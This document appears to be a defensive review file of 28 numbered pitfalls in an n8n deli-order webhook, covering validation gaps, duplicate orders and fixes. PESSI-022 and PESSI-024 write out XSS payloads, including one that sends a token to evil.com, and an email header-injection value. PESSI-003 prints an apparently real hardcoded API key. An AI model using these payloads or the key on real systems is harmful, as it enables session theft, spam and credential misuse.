# PESSI Pitfalls — Known Failure Modes (Critique / Challenge)

## Rule: Never repeat a known pitfall. If you find a new one, add it here.

---

## PESSI-001: NEW Webhook Must Validate COMPLETE Payloads, Not Incremental Stages
- **Context:** The legacy workflows validate per-stage (Contact → Item → Cart → Checkout). The NEW webhook receives everything in one POST.
- **Failure Mode:** If the NEW webhook only validates individual fields like the old form, it misses cross-field inconsistencies (e.g., subtotal doesn't match item prices x qty).
- **Fix:** Design validation as a single all-at-once schema check + business logic cross-validation (totals, tax rate, item consistency).

## PESSI-002: Client-Side Validation Is Not Server-Side Validation
- **Context:** The HTML form (`order-form.js`) does client-side hours validation and price calculation.
- **Failure Mode:** Attackers can bypass all client-side checks by sending raw JSON directly to the webhook. If the webhook trusts the client, it's vulnerable.
- **Fix:** The webhook MUST re-validate everything: totals, tax, hours, email format, phone format — independently of what the client sent.

## PESSI-003: Legacy Workflows Use External APIs for Email/Phone Validation
- **Context:** `Contact + Item + Cart` workflow uses Abstract API for email (`emailreputation.abstractapi.com`) and phone (`phoneintelligence.abstractapi.com`).
- **Failure Mode:** If Abstract API is down or rate-limited, orders fail silently OR the validation is skipped. Also: external API keys hardcoded in workflow JSON (`320d3bb43db84967a27c10fbce8a931e`).
- **Fix:** NEW webhook should have fallback validation (regex for email, libphonenumber for phone) AND never hardcode third-party keys in workflow files.

## PESSI-004: Legacy "Validate Total" Node Runs LATE in the Workflow
- **Context:** In `Order Received.json`, the `Validate Total` Code node checks `total_cents === subtotal_cents + tax_cents` but only AFTER the order has been processed through multiple prior nodes.
- **Failure Mode:** If totals are wrong, the workflow has already consumed resources (Sheets lookups, Square API calls, etc.) before failing.
- **Fix:** In the NEW webhook, validate ALL financials FIRST — before any external API calls, database writes, or email sends.

## PESSI-005: Legacy Workflow Lacks Input Sanitization
- **Context:** The legacy n8n workflows inject raw form field values directly into email HTML templates (`__CART_HTML__`, `customer_email`, etc.).
- **Failure Mode:** XSS via email template injection. A customer_name like `<script>alert(1)</script>` or `onload=alert(1)` could execute in email clients that render HTML.
- **Fix:** The NEW webhook MUST sanitize ALL user-provided strings before embedding in HTML emails. Use HTML encoding for `& < > " '`. n8n's `Handlebars` does NOT auto-escape by default.

## PESSI-006: Payment Link Expiration Is a Business Logic Gap
- **Context:** The reference workflow creates a Square payment link but doesn't validate that the link is still valid before sending it.
- **Failure Mode:** If an order sits in the system (e.g., retry loop, delayed webhook), a stale payment link could be sent to the customer.
- **Fix:** NEW webhook should include a timestamp check or link TTL validation. Also: the 2 AM expiration cron should be tested for race conditions.

## PESSI-007: Idempotency Key Reuse Risk in Square API
- **Context:** `Order Received.json` uses `$execution.id` as the Square idempotency key.
- **Failure Mode:** If n8n retries the same execution (e.g., after a timeout), Square may reject as duplicate OR may return the previous result, causing data inconsistency.
- **Fix:** Generate a unique idempotency key per attempt (UUID), not per execution. Or use Square's idempotency correctly with deterministic keys + retry flags.

## PESSI-008: Google Sheets OAuth Credential Is Placeholder
- **Context:** `utopia-deli-html-order-v1.json` uses `REPLACE_WITH_CREDENTIAL_ID` for Google Sheets node.
- **Failure Mode:** If not replaced before deployment, the workflow fails at the logging step. But worse: if someone commits a real credential ID, it's a leak.
- **Fix:** Always validate credential placeholders at import time. Use `$env.GOOGLE_SHEETS_CREDENTIAL_ID` or fail fast with a clear error.

## PESSI-009: Tax Rate Hardcoded in Multiple Places
- **Context:** Tax rate `9.52%` appears in `order-form.js`, `utopia-deli-html-order-v1.json`, and `Order_Received.json` metadata.
- **Failure Mode:** If the tax rate changes, all three must be updated. If they drift, the webhook rejects valid orders or accepts invalid ones.
- **Fix:** Single source of truth for tax rate — e.g., `$env.TAX_RATE` or a config lookup. Validate against this one value.

## PESSI-010: No Rate Limiting on Webhook Endpoint
- **Context:** The NEW webhook (`POST /webhook/utopia-deli-html-order-v1`) accepts any JSON from anywhere.
- **Failure Mode:** DDoS, brute-force, or abuse (e.g., submitting thousands of fake orders to exhaust Square API quota or spam the kitchen email).
- **Fix:** Implement rate limiting per IP and/or per email/phone. n8n doesn't have native rate limiting — consider middleware or Cloudflare.

## PESSI-011: NEW Webhook Validates Hours but NOT Day-of-Week Closure
- **Context:** The `Hours Gate` in `utopia-deli-html-order-v1.json` checks if `pickup_time` is within 10:30-15:00 CT but does NOT check if the deli is actually open on that day of week.
- **Failure Mode:** The legacy workflow's `If Open Hours` node checks both time AND day (`$json.test_mode === true || $json.isOpen === true`). The NEW webhook's Hours Gate only checks time. A customer could submit a Monday order on Sunday with pickup_time 11:00 — it passes validation but the deli is closed Monday (per legacy logic).
- **Fix:** Add day-of-week check to Hours Gate. Validate both `isOpen` (day) AND `in_hours` (time) before accepting order.

## PESSI-012: `order_id` Uses `Math.random()` — Collisions Possible
- **Context:** `Generate Order ID` node uses `Math.floor(Math.random() * 900) + 100` for the 3-digit sequence.
- **Failure Mode:** With ~100 orders/day, birthday problem applies. ~1% collision risk after ~30 days. Duplicate `order_id` → Square idempotency key collision → payment link creation fails or returns wrong link.
- **Fix:** Use timestamp + counter or UUID-based order ID. `UDO-${ymd}-${timestamp}-${counter}` or `$execution.id` + hash.

## PESSI-013: `item.price` in Webhook Payload Is Unit Price — No Cross-Check Against Menu Database
- **Context:** The NEW webhook accepts `item.price` as a number from the client. It validates `qty * price` is reasonable but does NOT verify the price matches the actual menu price.
- **Failure Mode:** Client-side JavaScript can be modified to send any price. A $13.00 sandwich could be sent as $0.01. Totals check passes (subtotal = sum of line items), but business loses money.
- **Fix:** NEW webhook must look up `item_id` against authoritative menu database/prices and reject if `item.price !== menu_price`. Legacy workflow has this implicitly because form options are hardcoded.

## PESSI-014: NEW Webhook Validates `subtotal/tax/total` as Floats Instead of Integer Cents
- **Context:** The NEW webhook (`utopia-deli-html-order-v1.json`) validates `subtotal`, `tax`, `total` as floats (`typeof body.subtotal !== 'number'`). The order form sends integer cents (`subtotal_cents`, `tax_cents`, `total_cents`).
- **Failure Mode:** Type mismatch! The NEW webhook expects `body.subtotal` (float dollars) but the form sends `body.subtotal_cents` (integer). The type check passes because JavaScript `typeof 1300 === 'number'`, but the totals verification code (`body.subtotal * 0.0952`) treats 1300 cents as $1300.00 — off by 100x. Also: the code checks `body.total.toFixed(2)` on 1300 → `"1300.00"`, expecting `"13.90"`.
- **Fix:** Either (a) form sends dollars (not recommended — floating point rounding issues) or (b) webhook validates `subtotal_cents`, `tax_cents`, `total_cents` as integers and renames all references, or (c) webhook converts cents to dollars on entry before validation.
- **Severity:** CRITICAL — this bug breaks ALL orders from the real form. Every order will fail totals validation.

## PESSI-015: `JSON.stringify` Directly on Request Body Can Crash on Circular References
- **Context:** The `raw_payload` column in Google Sheets logging does `JSON.stringify($json)`. If any node upstream adds circular references (common in n8n when merging nodes), this throws.
- **Failure Mode:** Order succeeds (payment link created, emails sent) but logging fails → error workflow fires, customer gets 500 after already receiving success, or duplicate orders from retries.
- **Fix:** Use a safe-stringify helper or log only specific fields. Also: move logging to AFTER respondToWebhook so customer doesn't see logging failures.

## PESSI-016: NEW Webhook Validates Fields That Don't Match the Form's Actual Field Names
- **Context:** The NEW webhook validates `body.subtotal`, `body.tax`, `body.total`, `body.order_items[].qty`, `body.order_items[].price`. But the order form sends `subtotal_cents`, `tax_cents`, `total_cents`, `order_items[].quantity`, `order_items[].unit_price_cents`, `order_items[].line_total_cents`.
- **Failure Mode:** Every single field name is different. The webhook validates fields that don't exist, then passes the data through to Square with wrong field names. `item.qty` is undefined → Square gets `"quantity": "undefined"`. `item.price` is undefined → `"amount": NaN`.
- **Fix:** Align webhook validation with actual form payload schema:
  - `subtotal_cents` (not `subtotal`)
  - `tax_cents` (not `tax`)
  - `total_cents` (not `total`)
  - `order_items[].quantity` (not `.qty`)
  - `order_items[].unit_price_cents` (not `.price`)
  - `order_items[].line_total_cents` (for cross-check)
  - `customer_name` (not `customer.name`)
  - `email` (not `customer.email`)
  - `phone` (not `customer.phone`)
- **Severity:** CRITICAL — the webhook is incompatible with its own form.

## PESSI-017: Item Price Can Be Zero or Negative
- **Context:** The NEW webhook validates `typeof item.price === 'number'` but does NOT check `item.price > 0`.
- **Failure Mode:** Attacker sends `price: 0` (free item) or `price: -5.00` (negative price offsets other items). A $0 order passes ALL validation (subtotal=0, tax=0, total=0). Kitchen prepares food, no payment collected. Negative price reduces total below actual cost.
- **Fix:** Add `item.price > 0` check. Better: look up `item_id` against authoritative menu database and reject if `Math.abs(item.price - menu_price) > 0.01`.
- **Severity:** HIGH — allows free orders and price manipulation.

## PESSI-018: Subtotal Doesn't Match Sum of Line Items
- **Context:** The NEW webhook checks `subtotal + tax === total` and `tax === subtotal x 0.0952` but does NOT verify that `subtotal === Sigma(qty x price)`.
- **Failure Mode:** Attacker sets `subtotal = 0.01`, `total = 0.01`, `tax = 0` with items totaling $50. The totals check passes, but customer pays $0.01 for $50 of food. Or attacker inflates subtotal to get a larger tax (refund scam).
- **Fix:** Calculate expected subtotal from `order_items` and verify it matches payload subtotal (+-$0.02):
  ```javascript
  const calcSubtotal = body.order_items.reduce((s, i) => s + (i.qty * i.price), 0);
  if (Math.abs(calcSubtotal - body.subtotal) > 0.02) throw new Error('Subtotal mismatch');
  ```
- **Severity:** CRITICAL — allows arbitrary underpayment.

## PESSI-019: Zero-Dollar Orders Are Accepted
- **Context:** The NEW webhook allows `total = 0` if `subtotal = 0` and `tax = 0`.
- **Failure Mode:** Attacker sends items with `price = 0` or empty order. The order passes validation, kitchen receives it, no payment is collected. Can be used to spam the kitchen with fake free orders.
- **Fix:** Add `body.total > 0` validation after all other checks. Reject orders with total <= $0.
- **Severity:** MEDIUM — nuisance attack, but wastes kitchen time.

## PESSI-020: String Fields Not Trimmed or Normalized
- **Context:** The NEW webhook checks `!item.name` but `item.name = "   "` (whitespace-only) passes because non-empty strings are truthy. Same for `customer_name: "   "`.
- **Failure Mode:** Kitchen email shows blank customer name. Square payment link has no customer name. Order tracking becomes impossible. Also: `email: "  user@example.com  "` passes regex but has leading/trailing spaces that break lookups.
- **Fix:** Trim all string fields before validation:
  ```javascript
  body.customer_name = String(body.customer_name || '').trim();
  body.email = String(body.email || '').trim();
  for (const item of body.order_items) {
    item.name = String(item.name || '').trim();
    if (!item.name) throw new Error('Item name cannot be empty');
  }
  ```
- **Severity:** LOW-MEDIUM — operational friction, not financial loss.

## PESSI-021: Fixed Tax Tolerance Allows Large Relative Errors on Small Orders
- **Context:** The NEW webhook uses `taxDiff > 0.02` as absolute tolerance.
- **Failure Mode:** On a $0.10 order, $0.02 tolerance is 20% of the total. Attacker can charge $0.02 extra tax (200% of expected $0.01 tax). On large orders, $0.02 is negligible (0.02% of $100).
- **Fix:** Use proportional tolerance: `Math.max(0.01, body.subtotal * 0.005)` (0.5% of subtotal, minimum $0.01).
- **Severity:** LOW — edge case, but inconsistent validation quality.

## PESSI-022: No Input Sanitization Before Embedding in Emails
- **Context:** The NEW webhook embeds raw user strings (`customer_name`, `email`, `special_instructions`, `item.name`) directly into email text fields using n8n's `emailSend` node. n8n does NOT auto-escape HTML in email bodies.
- **Failure Mode:** XSS in kitchen and customer emails. Example attacks:
  - `customer_name: "<script>alert(document.cookie)</script>"` — executes in HTML email clients (Gmail, Outlook, Apple Mail)
  - `special_instructions: "<img src=x onerror=fetch('https://evil.com?c='+localStorage.token)>"` — exfiltrates kitchen staff session data
  - `item.name: "<iframe src='javascript:alert(1)'>"` — frame injection in order emails
- **Why critical:** Kitchen staff read orders via email. All major email clients render HTML by default. One malicious order = kitchen staff compromised.
- **Fix:** Add sanitization Code node BEFORE any output (emails, Square, Sheets):
  ```javascript
  function sanitizeHtml(str) {
    return String(str)
      .replace(/\u0026/g, '\u0026amp;').replace(/\u003c/g, '\u0026lt;').replace(/\u003e/g, '\u0026gt;')
      .replace(/"/g, '\u0026quot;').replace(/'/g, '\u0026#x27;').replace(/\//g, '\u0026#x2F;');
  }
  function stripEventHandlers(str) {
    return str.replace(/\bon\w+\s*=/gi, 'data-blocked=');
  }
  // Apply to ALL user-facing fields
  body.customer_name = stripEventHandlers(sanitizeHtml(body.customer_name));
  body.special_instructions = stripEventHandlers(sanitizeHtml(body.special_instructions));
  for (const item of body.order_items) {
    item.name = stripEventHandlers(sanitizeHtml(item.name));
  }
  ```
- **Severity:** **CRITICAL** — email is primary order channel; kitchen staff are high-value targets.

## PESSI-023: JSON.stringify Logging Stores Attack Payloads Verbatim
- **Context:** `raw_payload: JSON.stringify($json)` in Google Sheets logging stores the COMPLETE request including any malicious strings.
- **Failure Mode:** Malicious payloads persist in Google Sheets indefinitely. If the sheet is exported, viewed via web, or processed by downstream automation, the attack propagates to new surfaces.
- **Fix:** Either (a) sanitize ALL fields before logging, or (b) log a whitelist of safe, sanitized fields only. Never store raw unsanitized input long-term.
- **Severity:** MEDIUM — extends attack window via data persistence.

## PESSI-024: Email Header Injection via Newlines in `email` Field
- **Context:** n8n's `emailSend` node uses the `email` field as the `toEmail` parameter. If the payload contains newlines, some SMTP libraries treat subsequent lines as additional headers (Bcc, Cc, Subject injection).
- **Failure Mode:** `email: "victim@example.com\nBcc: spam@target.com"` could cause the kitchen email system to send copies to attacker-controlled addresses or spam lists.
- **Fix:** Strip all `\r` and `\n` from email fields before passing to emailSend. Use strict email regex validation.
- **Severity:** MEDIUM — depends on n8n's underlying nodemailer version and SMTP server behavior.

## PESSI-025: No Duplicate Order Protection — Double-Submission Bug
- **Context:** The NEW webhook accepts orders via single POST. A customer (or bot) can submit the same payload twice in rapid succession, creating two separate n8n executions with different `$execution.id` values.
- **Failure Mode:** 
  - Two separate `order_id`s are generated (`UDO-YYYYMMDD-###` with random suffix)
  - Two separate Square payment links are created (different `idempotency_key`)
  - Two separate emails sent to customer and kitchen
  - Two separate rows in Google Sheets
  - Customer pays twice or gets confused by two links
  - Kitchen prepares duplicate order for one payment
- **Why worse than legacy:** Legacy Google Forms requires re-filling the form (friction). NEW HTML form is one-click; network hiccup or double-tap creates duplicate instantly.
- **Fix:** Implement multi-layer deduplication:
  1. **Client token:** Form sends `client_dedup_token` (UUID generated on page load)
  2. **Server fingerprint:** Hash of order content (`email + items + total + pickup_time`) with 60-second dedup window
  3. **Deterministic idempotency key:** Use `email + fingerprint + minute-timestamp` as Square idempotency key so same order within 60 seconds gets SAME payment link
  4. **SQLite/Google Sheets lookup:** Check for recent identical orders before creating Square link
  5. **Rate limiting:** Max 3 submissions per email per 5 minutes
- **Severity:** **HIGH** — real business loss from duplicate payments, confused customers, wasted food

## PESSI-026: Square Idempotency Key Is Random Per-Order, Not Per-Content
- **Context:** The NEW webhook generates a random `order_id` and uses it as the Square `idempotency_key`. The legacy workflow uses `$execution.id`.
- **Failure Mode:** If the SAME order is submitted twice (e.g., user double-clicks Submit, network retry, bot attack), the second submission gets a DIFFERENT random `order_id`, so Square treats it as a NEW order and creates a SECOND payment link. The idempotency key does NOT prevent duplicates — it only prevents duplicate Square API calls for the SAME key.
- **Fix:** Use a **deterministic** idempotency key based on order content, not randomness:
  ```javascript
  const idempotencyKey = `${body.email}-${orderFingerprint(body)}-${Math.floor(Date.now() / 60000)}`;
  ```
  This means: same customer + same order + within same 60-second window = same key = Square returns existing link.
  Also: store the idempotency key in Google Sheets so it can be referenced later.
- **Severity:** **HIGH** — direct cause of double-order bug

## PESSI-027: No Order Fingerprint for Cross-Reference Deduplication
- **Context:** The NEW webhook does not create a deterministic hash of the order content.
- **Failure Mode:** Without a fingerprint, there's no way to detect "this is the same order as 30 seconds ago" without comparing every field individually. A customer could change one character in `special_instructions` and bypass a naive dedup check.
- **Fix:** Generate a content hash that is resilient to minor variations:
  ```javascript
  function orderFingerprint(body) {
    const crypto = require('crypto');
    const canonical = {
      email: body.email.toLowerCase().trim(),
      phone: body.phone.replace(/\D/g, '').slice(-10),
      items: body.order_items
        .map(i => `${i.qty}x${i.name.trim()}@${i.unit_price_cents}`)
        .sort()
        .join('|'),
      total_cents: body.total_cents,
      pickup_time: body.pickup_time
    };
    return crypto.createHash('sha256')
      .update(JSON.stringify(canonical))
      .digest('hex')
      .slice(0, 16);
  }
  ```
- **Severity:** MEDIUM — enables robust dedup but not a direct attack vector

## PESSI-028: Kitchen Receives Duplicate Emails with No Deduplication Signal
- **Context:** When a duplicate order is created, the kitchen gets two identical "NEW ORDER" emails with different `order_id`s.
- **Failure Mode:** Kitchen staff may prepare both orders, not realizing they're duplicates. No visual cue (e.g., "DUPLICATE — check before preparing") in the email. Kitchen workflow doesn't check Sheets for recent identical orders.
- **Fix:** Add a "duplicate check" step BEFORE the kitchen email node:
  1. Query Google Sheets for orders with same email + same total + within last 5 minutes
  2. If found, append `[DUPLICATE?]` to email subject line
  3. Include a warning banner in the email body
  4. Log a dedup alert in a separate column
- **Severity:** MEDIUM — operational waste, not financial loss directly

---
## Meta: How PESSI Works
1. Read the reference workflows (they are bug-free learning material).
2. Find the ONE thing the reference does incrementally that the NEW webhook must do all-at-once.
3. Design the defense for the NEW webhook.
4. Document: attack vector, reference defense (per-stage), NEW webhook defense (all-at-once), gap analysis.
5. If you discover a new pitfall → add to this file (PESSI-NNN).
6. Append findings to `memory/shared-learning-dump.md` and `memory/YYYY-MM-DD.md`.
